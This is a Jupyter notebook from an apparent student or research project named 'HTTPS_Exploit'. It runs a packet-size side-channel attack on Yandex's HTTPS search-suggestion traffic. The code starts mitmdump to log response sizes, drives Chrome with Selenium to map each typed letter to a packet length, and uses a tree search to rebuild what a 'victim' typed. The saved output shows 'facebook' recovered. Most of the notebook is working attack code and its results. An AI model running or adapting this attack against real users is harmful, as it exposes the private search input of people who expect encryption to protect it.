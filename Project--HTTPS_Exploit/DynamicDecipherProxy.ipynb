{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true
   },
   "outputs": [],
   "source": [
    "from bs4 import BeautifulSoup\n",
    "from struct import *\n",
    "import urllib.request\n",
    "import warnings\n",
    "warnings.filterwarnings('ignore')\n",
    "import pandas as pd\n",
    "import numpy as np\n",
    "import ssl\n",
    "import os\n",
    "import sys\n",
    "import time\n",
    "import threading\n",
    "import re\n",
    "from selenium import webdriver\n",
    "from selenium.webdriver.common.keys import Keys\n",
    "from selenium.webdriver.support.ui import WebDriverWait\n",
    "from selenium.webdriver.support import expected_conditions as EC\n",
    "from selenium.webdriver.common.by import By\n",
    "from selenium.common.exceptions import TimeoutException\n",
    "from subprocess import STDOUT, PIPE, Popen, check_output, check_call, call\n",
    "import socket\n",
    "import netifaces as ni\n",
    "import string\n",
    "\n",
    "\n",
    "global driver\n",
    "\n",
    "# get local ip address\n",
    "ni.ifaddresses('en0')\n",
    "myip = ni.ifaddresses('en0')[2][0]['addr']\n",
    "\n",
    "# get keyword dictionary \n",
    "K=list()\n",
    "with open('keywords.txt','r') as f:\n",
    "    for line in f:\n",
    "        if len(line)>3:\n",
    "            K.append(line[:-1])\n",
    "\n",
    "def terminal(cmd):\n",
    "    os.system(cmd)\n",
    "\n",
    "    \n",
    "\n",
    "def deleteContent(fName):\n",
    "    with open(fName, \"w\") as f:\n",
    "        f.write(\"\");\n",
    "   # time.sleep(2)\n",
    "\n",
    "def readProxyDump(file):\n",
    "    time.sleep(1)\n",
    "    f=open(file,'r')\n",
    "    dump=''.join([line for line in f])\n",
    "    r=re.findall(\"yandex\\.com:443/suggest-spok.+\\s+response.+text/javascript;\\scharset=UTF-8,\\s+(\\d+)b\",dump)\n",
    "    f.close()\n",
    "    return list(map(int,r))    \n",
    "    \n",
    "def enterALetter(letter,inputElement):\n",
    "    deleteContent('sadu123.txt')\n",
    "    time.sleep(0.1)\n",
    "    inputElement.send_keys(letter)\n",
    "    time.sleep(0.1)\n",
    "    T2=readProxyDump('sadu123.txt')\n",
    "    time.sleep(0.1)\n",
    "    return list(map(int,T2))\n",
    "            \n",
    "def enterAWord(wrd,inputElement):\n",
    "   \n",
    "    time.sleep(0.5)\n",
    "    for c in wrd:\n",
    "        inputElement.send_keys(c)\n",
    "        time.sleep(0.3)\n",
    "    time.sleep(0.5)\n",
    "    deleteContent('sadu123.txt')    \n",
    "\n",
    "def enterAllAlphabet(inputElement):\n",
    "    deleteContent('sadu123.txt')\n",
    "    alphabet=list(string.ascii_lowercase)+[' ']\n",
    "    for c in alphabet:\n",
    "        time.sleep(0.1)\n",
    "        inputElement.send_keys(c)\n",
    "        time.sleep(0.1)\n",
    "        inputElement.send_keys(Keys.BACKSPACE)\n",
    "        \n",
    "    time.sleep(0.3)\n",
    "    T2=readProxyDump('sadu123.txt')\n",
    "    return list(map(int,T2))\n",
    "\n",
    "def mitmproxy():\n",
    "    cmd=\"\"\"mitmdump -s 'dumpfile.py yandex\\.com/suggest-spok)' \"\"\"\n",
    "    t=threading.Thread(target=terminal,args=([cmd]))\n",
    "    t.start()\n",
    "    #time.sleep(duration)\n",
    "    time.sleep(1)\n",
    "   # t.stop()\n",
    "    return t\n",
    "\n",
    "def mitmproxySecure():\n",
    "    cmd=\"\"\"mitmdump -s 'fixpackages.py (yandex\\.com/suggest-images|yandex\\.com/suggest-spok|yandex\\.com/suggest-video)' \"\"\"\n",
    "    t=threading.Thread(target=terminal,args=([cmd]))\n",
    "    t.start()\n",
    "    #time.sleep(duration)\n",
    "    time.sleep(1)\n",
    "   # t.stop()\n",
    "    return t\n",
    "\n",
    "\n",
    "\n",
    "def clearSearch(inputElement):\n",
    "    inputElement.clear()\n",
    "\n",
    "def findMatches(aList,packSize): # find matched packages, return indices\n",
    "    returnList=list()\n",
    "    if (len(aList) != 27):\n",
    "        print(len(aList))\n",
    "        print((aList))\n",
    "        raise ValueError('Your list size less than 27, func:findMatches')\n",
    "    \n",
    "    for i in range(0,len(aList)):\n",
    "        #print(aList[i])\n",
    "        if((packSize >= (aList[i]-2) and (packSize <= (aList[i]+3)))):\n",
    "            returnList.append(i)\n",
    "    return returnList\n",
    "\n",
    "def openYandex():\n",
    "    driver=webdriver.Chrome()\n",
    "    driver.get(\"https://yandex.com\")\n",
    "    time.sleep(2)\n",
    "    inputElement = driver.find_element_by_id(\"text\")\n",
    "    time.sleep(1)\n",
    "    driver_inputelement=list()\n",
    "    driver_inputelement.append(driver)\n",
    "    driver_inputelement.append(inputElement)\n",
    "    return driver_inputelement\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "54"
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "myip\n",
    "\n",
    "len(readProxyDump('sadu123.txt'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "deleteContent('sadu123.txt') ## IMPORTANT: IF I TYPE FAST SEQUENCE PROBLEM EXIST\n",
    "call(['echo', 'Lets Do Some Fun'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "deletable": true,
    "editable": true
   },
   "source": [
    "### Start Regular Proxy"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true,
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "tp=mitmproxy() # file name is specified inside dumpfile.py \"sadu123.txt\" for the time being\n",
    "call(['echo', 'Proxy Starting in Normal Mode...'])\n",
    "call(['echo', 'Configuring...'])\n",
    "time.sleep(2)\n",
    "deleteContent('sadu123.txt')\n",
    "call(['echo', 'Proxy Ready...'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "deletable": true,
    "editable": true
   },
   "source": [
    "### Start Secure Proxy"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "tp=mitmproxySecure() # file name is specified inside dumpfile.py \"sadu123.txt\" for the time being\n",
    "call(['echo', 'Proxy Starting in Secure Mode...'])\n",
    "call(['echo', 'Configuring...'])\n",
    "time.sleep(2)\n",
    "deleteContent('sadu123.txt')\n",
    "call(['echo', 'Proxy Ready...'])\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "deletable": true,
    "editable": true
   },
   "source": [
    "### Victim Types some input"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[763, 860, 860, 860, 860, 860, 860, 843]\n"
     ]
    }
   ],
   "source": [
    "T=readProxyDump('sadu123.txt') \n",
    "print(T)\n",
    "deleteContent('sadu123.txt')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true
   },
   "source": [
    "### Open browser where packet size('A') == 759\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Browser Ready\n"
     ]
    }
   ],
   "source": [
    "# PACKAGE SIZES VARY ~2,3 BYTES\n",
    "# 757, ... , 782 -> 757 AND 782 REALLY RARE CASES,\n",
    "# OVERALL 759-2 TO 759 + 3 \n",
    "# LUCKILY IF ONE LETTER CHANGES 1 BYTE, ALL OF THE OTHER LETTERS CHANGE 1 BYTE\n",
    "\n",
    "# OPEN GOOGLE CHROME UP UNTIL A==759\n",
    "deleteContent('sadu123.txt')\n",
    "time.sleep(1)\n",
    "driver_inputelement = []\n",
    "sizeA=[]\n",
    "while(1):\n",
    "    driver_inputelement = openYandex()\n",
    "    inputElement = driver_inputelement[1]\n",
    "    sizeA=enterALetter('a', inputElement )\n",
    "    driver=driver_inputelement[0]\n",
    "    if( sizeA[0] != 759):\n",
    "        print(sizeA)\n",
    "        driver.close()\n",
    "    else:\n",
    "        inputElement.clear()\n",
    "        inputElement.click()\n",
    "        break  \n",
    "\n",
    "inputElement= driver_inputelement[1]\n",
    "call(['echo', 'Browser Ready'])\n",
    "print('Browser Ready')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "deletable": true,
    "editable": true
   },
   "source": [
    "### Start Deciphering Process"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true,
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Letter Package Sizes [759, 770, 776, 768, 753, 763, 823, 770, 758, 782, 746, 765, 751, 798, 790, 759, 759, 757, 772, 768, 777, 781, 836, 756, 826, 752, 59]\n",
      "First letter options: f l \n",
      "\n",
      "CurrentNode:  {'char': 'f', 'parent': 0, 'degree': 1, 'flag': 1}\n",
      "toBeTypedBefore:f\n",
      "next letter options:a \n",
      "Number of added letters: 1\n",
      "\n",
      "CurrentNode:  {'char': 'l', 'parent': 0, 'degree': 1, 'flag': 1}\n",
      "toBeTypedBefore:l\n",
      "Next letter does not exist\n",
      "\n",
      "{'char': 'l', 'parent': 0, 'degree': 1, 'flag': 1}-> flag set to 0:\n",
      "Number of Nodes:1\n",
      "\n",
      "\n",
      "CurrentNode:  {'char': 'a', 'parent': 1, 'degree': 2, 'flag': 1}\n",
      "toBeTypedBefore:fa\n",
      "next letter options:c \n",
      "Number of added letters: 1\n",
      "Number of Nodes:1\n",
      "\n",
      "\n",
      "CurrentNode:  {'char': 'c', 'parent': 3, 'degree': 3, 'flag': 1}\n",
      "toBeTypedBefore:fac\n",
      "next letter options:e \n",
      "Number of added letters: 1\n",
      "Number of Nodes:1\n",
      "\n",
      "\n",
      "CurrentNode:  {'char': 'e', 'parent': 4, 'degree': 4, 'flag': 1}\n",
      "toBeTypedBefore:face\n",
      "next letter options:b s \n",
      "Number of added letters: 2\n",
      "Number of Nodes:2\n",
      "\n",
      "\n",
      "CurrentNode:  {'char': 'b', 'parent': 5, 'degree': 5, 'flag': 1}\n",
      "toBeTypedBefore:faceb\n",
      "next letter options:o \n",
      "Number of added letters: 1\n",
      "\n",
      "CurrentNode:  {'char': 's', 'parent': 5, 'degree': 5, 'flag': 1}\n",
      "toBeTypedBefore:faces\n",
      "Next letter does not exist\n",
      "\n",
      "{'char': 's', 'parent': 5, 'degree': 5, 'flag': 1}-> flag set to 0:\n",
      "Number of Nodes:1\n",
      "\n",
      "\n",
      "CurrentNode:  {'char': 'o', 'parent': 6, 'degree': 6, 'flag': 1}\n",
      "toBeTypedBefore:facebo\n",
      "next letter options:o \n",
      "Number of added letters: 1\n",
      "Number of Nodes:1\n",
      "\n",
      "\n",
      "CurrentNode:  {'char': 'o', 'parent': 8, 'degree': 7, 'flag': 1}\n",
      "toBeTypedBefore:faceboo\n",
      "next letter options:k \n",
      "Number of added letters: 1\n",
      "Number of Nodes:1\n",
      "\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "call(['echo', 'Deciphering Process Starting...'])\n",
    "time.sleep(2)\n",
    "\n",
    "tree=[]\n",
    "topofTree={'char':'null', 'parent':-1, 'degree':0, 'flag':1} #flag shows if node is active or removed\n",
    "# topofTree['parent']\n",
    "tree.append(topofTree)\n",
    "#tree[0]['parent']\n",
    "\n",
    "userInput=T\n",
    "userInputSize=len(userInput)\n",
    "i = 0\n",
    "alphabet=list(string.ascii_lowercase)+[' ']\n",
    "\n",
    "#OPEN CHROME w8 for 3 sec\n",
    "currentDegree=0\n",
    "deleteContent('sadu123.txt')  #delete content of the log file\n",
    "\n",
    "while(i<userInputSize):\n",
    "    currentPackSize=userInput[i]\n",
    "    inserted=0 # check if new node inserted or not to increment degree\n",
    "    newNodesOfTree=[] #new Nodes to be inserted into the tree at the end of 26 letter type process\n",
    "    #if first letter, directly type all letters, insert matches\n",
    "    if( i==0 ):\n",
    "        i = i + 1\n",
    "        #inputElement = openYandex() \n",
    "        #deleteContent('sadu123.txt') #delete contents\n",
    "        letterPackSizes = enterAllAlphabet(inputElement) #type 26 letter\n",
    "        print('Letter Package Sizes',end=' ') \n",
    "        print(letterPackSizes)       \n",
    "        \n",
    "        #insert matches to the tree\n",
    "        indices = findMatches(letterPackSizes,userInput[0])\n",
    "        print('First letter options: ',end='')\n",
    "\n",
    "        for x in range(0,len(indices)):\n",
    "            print( alphabet[ indices[x] ],end=' ' )\n",
    "            newNode = {'char':alphabet[indices[x]],'parent':0,'degree':1,'flag':1}\n",
    "            tree.append(newNode)\n",
    "            #print(alphabet[indices[x]])\n",
    "        currentDegree += 1\n",
    "        print('')\n",
    "        continue\n",
    "      \n",
    "    # number of elements that have i degree\n",
    "    rootNum=len([t for t in range(len(tree)) if tree[t]['degree']==currentDegree])\n",
    "\n",
    "    for j in range (rootNum,0,-1):\n",
    "        newNode=tree[len(tree)-j]\n",
    "        #if(newNode['flag']==0) continue # if removed node no need to go on\n",
    "        toBeTypedBefore=[]\n",
    "        currentNode=newNode\n",
    "        print('\\nCurrentNode: ',end=' ')\n",
    "        print(currentNode)\n",
    "        \n",
    "        while( currentNode['parent'] != -1 ):\n",
    "            toBeTypedBefore.append(currentNode['char']) # bottom one inserted\n",
    "            currentNode=tree[currentNode['parent']]\n",
    "        currentNode=newNode\n",
    "        toBeTypedBefore=toBeTypedBefore[::-1]\n",
    "        print(\"toBeTypedBefore:\" + ''.join(toBeTypedBefore))  #type reverse of toBeTypedBefore\n",
    "        \n",
    "        clearSearch(inputElement)  #clear search engine\n",
    "        #time.sleep(10)\n",
    "        enterAWord(toBeTypedBefore,inputElement)        #type toBeType\n",
    "        deleteContent('sadu123.txt') #delete contents\n",
    "        time.sleep(0.1)\n",
    "        letterPackSizes=enterAllAlphabet(inputElement) #type 26 letter after that \n",
    "       # print(\"letterPackSizes\" + repr(letterPackSizes) + \"\\n\")\n",
    "        letterPackSizesTemp = []\n",
    "        \n",
    "        for k in range (0,len(letterPackSizes),2): #remove repetitive package sizes\n",
    "            letterPackSizesTemp.append(letterPackSizes[k])\n",
    "        letterPackSizesDebug = letterPackSizes # this is for debug purposes\n",
    "        letterPackSizes=letterPackSizesTemp\n",
    "       # print('letterTempPackSizes' + repr(letterPackSizes) +'\\n')\n",
    "\n",
    "        indices=findMatches(letterPackSizes,userInput[i]) #find matches\n",
    "        if(len(indices) == 0):\n",
    "            print('Next letter does not exist')\n",
    "        else:  \n",
    "            print('next letter options:',end='')\n",
    "            for x in range(0,len(indices)):\n",
    "                print( alphabet[indices[x]],end=' ')\n",
    "        print('')\n",
    "\n",
    "        tempNode=[]\n",
    "        \n",
    "        if(len(indices)==0): #if there is no match kill that path\n",
    "          # while( currentNode['parent'] != -1 ): #remove recursively\n",
    "            tempNode=tree[currentNode['parent']]\n",
    "            print(repr(currentNode) + '-> flag set to 0:')\n",
    "            index=tree.index(currentNode) #find location of currentnode\n",
    "            tree[index]['flag']=0\n",
    "            currentNode=tempNode\n",
    "        else :#else insert matches to that node\n",
    "        \n",
    "            print('Number of added letters: ' + repr(len(indices)))\n",
    "            if(len(indices) == 26):\n",
    "                print('SORRY ADMIN... NO MORE REDUCTION in this path ')\n",
    "                continue\n",
    "            else:  \n",
    "                inserted=1\n",
    "                for x in range(0,len(indices)):\n",
    "                    newNode={'char':alphabet[indices[x]],'parent':tree.index(currentNode),'degree':(currentDegree+1),'flag':1}\n",
    "                    newNodesOfTree.append(newNode)\n",
    "                    #print(\"newNodesOfTree:\")\n",
    "                    #print(newNodesOfTree)\n",
    "    \n",
    "            \n",
    "   \n",
    "    if(inserted):\n",
    "        currentDegree=currentDegree+1\n",
    "    \n",
    "    print('Number of Nodes:' + repr(len(newNodesOfTree)) +'\\n')\n",
    "    tree=tree+newNodesOfTree\n",
    "    \n",
    "    \n",
    "    \n",
    "    i=i+1 \n",
    "\n",
    "call(['echo', 'Deciphering Process Done...'])\n",
    "\n",
    "    \n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true
   },
   "outputs": [],
   "source": [
    "#letterPackSizes\n",
    "#letterPackSizesDebug\n",
    "#len(letterPackSizesDebug)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "deletable": true,
    "editable": true
   },
   "source": [
    "### Print Tree, Show possible inputs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Path 0\n",
      "{'char': 'l', 'parent': 0, 'degree': 1, 'flag': 0}\n",
      "Path 1\n",
      "{'char': 'f', 'parent': 0, 'degree': 1, 'flag': 1}\n",
      "{'char': 'a', 'parent': 1, 'degree': 2, 'flag': 1}\n",
      "{'char': 'c', 'parent': 3, 'degree': 3, 'flag': 1}\n",
      "{'char': 'e', 'parent': 4, 'degree': 4, 'flag': 1}\n",
      "{'char': 's', 'parent': 5, 'degree': 5, 'flag': 0}\n",
      "\n",
      "Deciphering...\n",
      "Victim typed...\n",
      "\n",
      "Path 0\n",
      "{'char': 'f', 'parent': 0, 'degree': 1, 'flag': 1}\n",
      "{'char': 'a', 'parent': 1, 'degree': 2, 'flag': 1}\n",
      "{'char': 'c', 'parent': 3, 'degree': 3, 'flag': 1}\n",
      "{'char': 'e', 'parent': 4, 'degree': 4, 'flag': 1}\n",
      "{'char': 'b', 'parent': 5, 'degree': 5, 'flag': 1}\n",
      "{'char': 'o', 'parent': 6, 'degree': 6, 'flag': 1}\n",
      "{'char': 'o', 'parent': 8, 'degree': 7, 'flag': 1}\n",
      "{'char': 'k', 'parent': 9, 'degree': 8, 'flag': 1}\n"
     ]
    }
   ],
   "source": [
    "tree\n",
    "\n",
    "\n",
    "ix=[t for t in range(len(tree)) if tree[t]['flag']==0]\n",
    "#print(ix)\n",
    "   \n",
    "   \n",
    "for t in range(len(ix)):\n",
    "    print('Path ' + repr(t))\n",
    "    toBePrinted=[]\n",
    "    node=(tree[ix[t]])\n",
    "    while(node['parent'] != -1):\n",
    "        #print(node)\n",
    "        toBePrinted.append(node)\n",
    "        node=tree[node['parent']]\n",
    "    for k in range (len(toBePrinted),0,-1):\n",
    "        print(toBePrinted[k-1])\n",
    "#Final Paths\n",
    "\n",
    "print('\\nDeciphering...')\n",
    "print('Victim typed...\\n')\n",
    "\n",
    "ix=[t for t in range(len(tree)) if tree[t]['degree']==(currentDegree)]\n",
    "\n",
    "# find nodes which satisfy nodes.degree == currentdegree \n",
    "for t in range(len(ix)):\n",
    "    print('Path ' + repr(t))\n",
    "    toBePrinted=[]\n",
    "    node=(tree[ix[t]])\n",
    "    while(node['parent'] != -1):\n",
    "        toBePrinted.append(node)\n",
    "        node=tree[node['parent']]\n",
    "    for k in range (len(toBePrinted),0,-1):\n",
    "        print(toBePrinted[k-1])\n",
    "\n",
    "#indices=findMatches(tree['flag'],lambda x:x==0)\n",
    "#indices\n",
    "#for i in range (0,degree):\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
